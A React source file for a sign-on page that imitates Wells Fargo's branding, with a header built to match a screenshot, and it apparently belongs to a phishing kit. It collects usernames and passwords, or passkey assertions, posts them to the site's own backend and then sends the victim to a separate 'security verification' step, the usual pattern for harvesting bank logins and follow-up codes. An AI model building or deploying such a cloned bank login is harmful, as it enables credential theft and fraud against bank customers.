import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);
  const [usernameValue, setUsernameValue] = useState("");

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified,
            userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({ title: "Face ID Sign On Successful", description: "Please complete security verification..." });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", { username: data.username, password: data.password });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid username or password", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  const LoginCard = ({ isDesktop = false }: { isDesktop?: boolean }) => (
    <div
      className="rounded-2xl shadow-2xl"
      style={{
        width: isDesktop ? 420 : "100%",
        padding: isDesktop ? "40px 44px" : "28px 18px 40px",
        backgroundColor: "#ffffff",
      }}
    >
      <h2
        className="font-normal text-[#111] text-center leading-none mb-7"
        style={{
          fontFamily: "Georgia, 'Times New Roman', serif",
          fontSize: isDesktop ? 34 : 32,
        }}
        data-testid="text-greeting"
      >
        {greeting}
      </h2>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username field */}
        <div className="mb-[10px] relative">
          <input
            {...form.register("username", { required: true })}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            onChange={(e) => {
              form.setValue("username", e.target.value);
              setUsernameValue(e.target.value);
            }}
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 44px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-username"
          />
          {usernameValue && (
            <button
              type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              className="absolute right-[12px] top-1/2 -translate-y-1/2"
              data-testid="button-clear-username"
            >
              <svg viewBox="0 0 20 20" width="20" height="20" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#aaa" strokeWidth="1.5" />
                <path d="M7 7l6 6M13 7l-6 6" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
            </button>
          )}
        </div>

        {/* Password field */}
        <div className="mb-[14px] relative">
          <input
            {...form.register("password", { required: true })}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 56px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-password"
          />
          <button
            type="button"
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
            data-testid="button-toggle-password"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div className="flex items-center gap-[10px] mb-[8px]">
          <div
            className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
            style={{ borderRadius: 3 }}
            onClick={() => setSaveUsername(!saveUsername)}
            data-testid="checkbox-save-username"
          >
            {saveUsername && (
              <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            )}
          </div>
          <label className="text-[15px] text-gray-800 cursor-pointer select-none" onClick={() => setSaveUsername(!saveUsername)}>
            Save username
          </label>
        </div>

        {/* Security text */}
        <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        {/* Sign on button */}
        <div className="flex justify-center mb-[14px]">
          <button
            type="submit"
            disabled={loginMutation.isPending}
            className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
            style={{ height: 50, width: 220, backgroundColor: "#d0d0d0", color: "#888" }}
            data-testid="button-sign-on"
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

      {/* Passkey button */}
      <div className="flex justify-center mb-[14px]">
        <button
          type="button"
          onClick={handleBiometricLogin}
          disabled={biometricLoading}
          className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
          style={{ height: 50, width: 220, border: "1.5px solid #222" }}
          data-testid="button-passkey"
        >
          <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
            <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
            <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
            <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="0.8" fill="#333" />
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div className="flex items-center justify-center gap-[5px]">
        <span className="text-[#4b3f9e] text-[15px]">→</span>
        <Link href="/forgot-password" className="text-[#4b3f9e] text-[15px] hover:underline" data-testid="link-forgot">
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP LAYOUT ── */}
      <div className="hidden lg:flex flex-col min-h-screen">

        {/* Header — Wells Fargo standard red matching screenshot */}
        <header style={{ backgroundColor: "#b01e22", flexShrink: 0 }}>
          <div className="px-6 flex items-center justify-between" style={{ height: 48 }}>
            <div
              className="text-white font-bold tracking-[0.14em]"
              style={{ fontFamily: "'Times New Roman', Georgia, serif", fontSize: 21 }}
            >
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-white" style={{ fontSize: 13 }}>
              <div className="flex items-center gap-1.5 cursor-pointer hover:underline">
                <svg viewBox="0 0 16 16" width="13" height="13" fill="none">
                  <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="white" strokeWidth="1.4" />
                  <path d="M5.5 7V5a2.5 2.5 0 0 1 5 0v2" stroke="white" strokeWidth="1.4" strokeLinecap="round" />
                </svg>
                <Link href="/register" className="text-white hover:underline">Enroll</Link>
              </div>
              <span className="cursor-pointer hover:underline">Customer Service</span>
              <span className="cursor-pointer hover:underline">ATMs/Locations</span>
              <span className="cursor-pointer hover:underline">Español</span>
              {/* Search box — white box with search icon */}
              <div
                className="flex items-center justify-between bg-white cursor-pointer"
                style={{ height: 28, borderRadius: 3, padding: "0 8px 0 10px", gap: 6, minWidth: 80 }}
              >
                <span className="text-gray-400" style={{ fontSize: 12 }}>Search</span>
                <div
                  className="flex items-center justify-center rounded-sm"
                  style={{ width: 22, height: 22, backgroundColor: "#b01e22" }}
                >
                  <Search className="text-white" style={{ width: 12, height: 12 }} />
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Full-page background with centered card */}
        <div
          className="flex-1 flex items-center justify-center relative overflow-hidden"
          style={{ minHeight: "calc(100vh - 46px)" }}
        >
          {/* Sky — bright snowy winter day, light blue-white */}
          <div className="absolute inset-0" style={{
            background: `linear-gradient(to bottom,
              #7aadc4 0%,
              #96c0d4 8%,
              #aed0e0 18%,
              #c2dde8 28%,
              #d0e6ee 38%,
              #daedf4 48%,
              #e2f0f6 56%,
              #e8f3f8 64%,
              #eef6fa 72%,
              #f2f8fb 80%,
              #f5f9fc 88%,
              #f8fbfd 94%,
              #fafcfe 100%
            )`
          }} />

          {/* Full-screen SVG — snowy winter scene */}
          <svg
            className="absolute inset-0"
            viewBox="0 0 1440 900"
            preserveAspectRatio="xMidYMid slice"
            style={{ width: "100%", height: "100%" }}
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              <linearGradient id="snowGround" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#deeef8" />
                <stop offset="100%" stopColor="#c8e2f0" />
              </linearGradient>
              <linearGradient id="snowGround2" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#e8f4fb" />
                <stop offset="100%" stopColor="#d5ecf8" />
              </linearGradient>
              {/* Mist/haze overlay for distant trees */}
              <linearGradient id="mistFade" x1="0" y1="1" x2="0" y2="0">
                <stop offset="0%" stopColor="#d8edf7" stopOpacity="0" />
                <stop offset="100%" stopColor="#d8edf7" stopOpacity="0.55" />
              </linearGradient>
              <filter id="blur1">
                <feGaussianBlur stdDeviation="3" />
              </filter>
              <filter id="blur2">
                <feGaussianBlur stdDeviation="1.5" />
              </filter>
            </defs>

            {/* ── Snow ground ── */}
            <ellipse cx="720" cy="870" rx="900" ry="100" fill="url(#snowGround)" />
            <rect x="0" y="800" width="1440" height="100" fill="url(#snowGround2)" />

            {/* ── Distant background trees (misty, very light) ── */}
            {/* Far left distant */}
            <g filter="url(#blur1)" opacity="0.55">
              <rect x="60" y="560" width="10" height="200" fill="#8aafc0" />
              <ellipse cx="65" cy="490" rx="55" ry="80" fill="#c5dce8" />
              <ellipse cx="45" cy="520" rx="38" ry="55" fill="#cce3ee" />
              <ellipse cx="88" cy="510" rx="42" ry="60" fill="#c8dfe9" />
            </g>
            <g filter="url(#blur1)" opacity="0.5">
              <rect x="155" y="570" width="9" height="190" fill="#8aafc0" />
              <ellipse cx="160" cy="500" rx="50" ry="75" fill="#c8e0eb" />
              <ellipse cx="138" cy="530" rx="36" ry="52" fill="#cde4ef" />
              <ellipse cx="182" cy="520" rx="40" ry="58" fill="#cadfea" />
            </g>
            {/* Far right distant */}
            <g filter="url(#blur1)" opacity="0.55">
              <rect x="1370" y="555" width="10" height="205" fill="#8aafc0" />
              <ellipse cx="1375" cy="482" rx="55" ry="80" fill="#c5dce8" />
              <ellipse cx="1352" cy="515" rx="38" ry="55" fill="#cce3ee" />
              <ellipse cx="1398" cy="504" rx="42" ry="60" fill="#c8dfe9" />
            </g>
            <g filter="url(#blur1)" opacity="0.5">
              <rect x="1270" y="565" width="9" height="195" fill="#8aafc0" />
              <ellipse cx="1275" cy="494" rx="50" ry="75" fill="#c8e0eb" />
              <ellipse cx="1252" cy="524" rx="36" ry="52" fill="#cde4ef" />
              <ellipse cx="1298" cy="514" rx="40" ry="58" fill="#cadfea" />
            </g>

            {/* ── Mid-ground trees — left side ── */}
            <g filter="url(#blur2)" opacity="0.75">
              {/* Tree 1 */}
              <rect x="238" y="520" width="13" height="240" fill="#7096a8" />
              <ellipse cx="244" cy="440" rx="70" ry="95" fill="#b8d5e4" />
              <ellipse cx="218" cy="475" rx="50" ry="68" fill="#bfd9e8" />
              <ellipse cx="272" cy="465" rx="55" ry="72" fill="#bcd7e6" />
              <ellipse cx="244" cy="400" rx="42" ry="55" fill="#c2dcea" />
              {/* Tree 2 */}
              <rect x="318" y="540" width="11" height="220" fill="#7096a8" />
              <ellipse cx="324" cy="462" rx="62" ry="85" fill="#bcd8e6" />
              <ellipse cx="302" cy="494" rx="44" ry="62" fill="#c2dcea" />
              <ellipse cx="348" cy="484" rx="48" ry="66" fill="#bed9e7" />
            </g>
            {/* Mid-ground trees — right side */}
            <g filter="url(#blur2)" opacity="0.75">
              {/* Tree 1 */}
              <rect x="1186" y="520" width="13" height="240" fill="#7096a8" />
              <ellipse cx="1192" cy="440" rx="70" ry="95" fill="#b8d5e4" />
              <ellipse cx="1166" cy="475" rx="50" ry="68" fill="#bfd9e8" />
              <ellipse cx="1220" cy="465" rx="55" ry="72" fill="#bcd7e6" />
              <ellipse cx="1192" cy="400" rx="42" ry="55" fill="#c2dcea" />
              {/* Tree 2 */}
              <rect x="1106" y="540" width="11" height="220" fill="#7096a8" />
              <ellipse cx="1112" cy="462" rx="62" ry="85" fill="#bcd8e6" />
              <ellipse cx="1090" cy="494" rx="44" ry="62" fill="#c2dcea" />
              <ellipse cx="1136" cy="484" rx="48" ry="66" fill="#bed9e7" />
            </g>

            {/* ── Foreground trees — large, detailed, with visible trunks ── */}
            {/* Far left foreground — large deciduous */}
            <g>
              <rect x="28" y="480" width="18" height="320" fill="#5a7a8a" />
              {/* Snow on branches — multiple overlapping blobs */}
              <ellipse cx="37" cy="380" rx="90" ry="115" fill="#ddeef7" />
              <ellipse cx="10" cy="420" rx="62" ry="82" fill="#e2f1f8" />
              <ellipse cx="68" cy="410" rx="68" ry="88" fill="#deeef7" />
              <ellipse cx="37" cy="330" rx="58" ry="72" fill="#e5f3f9" />
              <ellipse cx="15" cy="360" rx="42" ry="55" fill="#e8f4fa" />
              <ellipse cx="62" cy="350" rx="48" ry="62" fill="#e5f3f9" />
              {/* Snow mounds on outer branches */}
              <ellipse cx="-15" cy="440" rx="38" ry="28" fill="#eaf5fb" />
              <ellipse cx="90" cy="430" rx="42" ry="30" fill="#e8f4fb" />
              {/* Branch lines */}
              <line x1="37" y1="400" x2="-10" y2="445" stroke="#6a8a9a" strokeWidth="3" opacity="0.6" />
              <line x1="37" y1="400" x2="85" y2="438" stroke="#6a8a9a" strokeWidth="3" opacity="0.6" />
              <line x1="37" y1="370" x2="5" y2="340" stroke="#6a8a9a" strokeWidth="2" opacity="0.5" />
              <line x1="37" y1="370" x2="70" y2="338" stroke="#6a8a9a" strokeWidth="2" opacity="0.5" />
            </g>
            {/* Second left foreground */}
            <g>
              <rect x="128" y="510" width="15" height="290" fill="#5a7a8a" />
              <ellipse cx="136" cy="418" rx="75" ry="98" fill="#daedf6" />
              <ellipse cx="112" cy="452" rx="54" ry="70" fill="#dff2f8" />
              <ellipse cx="162" cy="442" rx="58" ry="75" fill="#dceef7" />
              <ellipse cx="136" cy="372" rx="48" ry="62" fill="#e2f1f9" />
              <ellipse cx="115" cy="400" rx="36" ry="48" fill="#e5f3f9" />
              <ellipse cx="158" cy="392" rx="40" ry="52" fill="#e2f2f9" />
              <line x1="136" y1="435" x2="95" y2="472" stroke="#6a8a9a" strokeWidth="2.5" opacity="0.55" />
              <line x1="136" y1="435" x2="178" y2="465" stroke="#6a8a9a" strokeWidth="2.5" opacity="0.55" />
            </g>
            {/* Far right foreground — large deciduous */}
            <g>
              <rect x="1394" y="480" width="18" height="320" fill="#5a7a8a" />
              <ellipse cx="1403" cy="380" rx="90" ry="115" fill="#ddeef7" />
              <ellipse cx="1376" cy="420" rx="62" ry="82" fill="#e2f1f8" />
              <ellipse cx="1434" cy="410" rx="68" ry="88" fill="#deeef7" />
              <ellipse cx="1403" cy="330" rx="58" ry="72" fill="#e5f3f9" />
              <ellipse cx="1381" cy="360" rx="42" ry="55" fill="#e8f4fa" />
              <ellipse cx="1428" cy="350" rx="48" ry="62" fill="#e5f3f9" />
              <ellipse cx="1370" cy="440" rx="38" ry="28" fill="#eaf5fb" />
              <ellipse cx="1456" cy="430" rx="42" ry="30" fill="#e8f4fb" />
              <line x1="1403" y1="400" x2="1356" y2="445" stroke="#6a8a9a" strokeWidth="3" opacity="0.6" />
              <line x1="1403" y1="400" x2="1451" y2="438" stroke="#6a8a9a" strokeWidth="3" opacity="0.6" />
            </g>
            {/* Second right foreground */}
            <g>
              <rect x="1296" y="510" width="15" height="290" fill="#5a7a8a" />
              <ellipse cx="1304" cy="418" rx="75" ry="98" fill="#daedf6" />
              <ellipse cx="1278" cy="452" rx="54" ry="70" fill="#dff2f8" />
              <ellipse cx="1330" cy="442" rx="58" ry="75" fill="#dceef7" />
              <ellipse cx="1304" cy="372" rx="48" ry="62" fill="#e2f1f9" />
              <line x1="1304" y1="435" x2="1263" y2="472" stroke="#6a8a9a" strokeWidth="2.5" opacity="0.55" />
              <line x1="1304" y1="435" x2="1346" y2="465" stroke="#6a8a9a" strokeWidth="2.5" opacity="0.55" />
            </g>

            {/* ── Snow ground surface ── */}
            <path
              d="M0,800 Q120,778 280,788 Q440,798 580,780 Q720,762 860,780 Q1000,798 1160,788 Q1320,778 1440,795 L1440,900 L0,900 Z"
              fill="#e0f0f8"
            />
            <path
              d="M0,830 Q200,812 400,820 Q600,828 720,815 Q840,802 1040,820 Q1240,838 1440,825 L1440,900 L0,900 Z"
              fill="#eaf5fb"
            />

            {/* Mist overlay (makes distant trees feel cold/misty) */}
            <rect x="0" y="400" width="1440" height="400" fill="url(#mistFade)" opacity="0.4" />

            {/* Snow falling particles (subtle) */}
            {[30,90,155,220,290,360,430,500,575,645,715,785,860,930,1005,1075,1145,1215,1285,1355,1410].map((x, i) => (
              <circle key={i} cx={x} cy={80 + (i * 37) % 280} r="2.5" fill="white" opacity={0.5 + (i % 3) * 0.15} />
            ))}
            {[55,130,200,270,345,415,490,560,635,705,775,845,920,990,1060,1130,1200,1270,1340,1420].map((x, i) => (
              <circle key={i + 30} cx={x} cy={140 + (i * 43) % 220} r="1.8" fill="white" opacity={0.35 + (i % 3) * 0.12} />
            ))}
          </svg>

          {/* Login card — centered */}
          <div className="relative z-10" style={{ marginBottom: 40 }}>
            <LoginCard isDesktop={true} />
          </div>
        </div>
      </div>

      {/* ── MOBILE LAYOUT ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button
              type="button"
              aria-label="Menu"
              data-testid="button-mobile-menu"
              className="flex flex-col justify-center gap-[5px] py-2"
            >
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            <LoginCard isDesktop={false} />
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
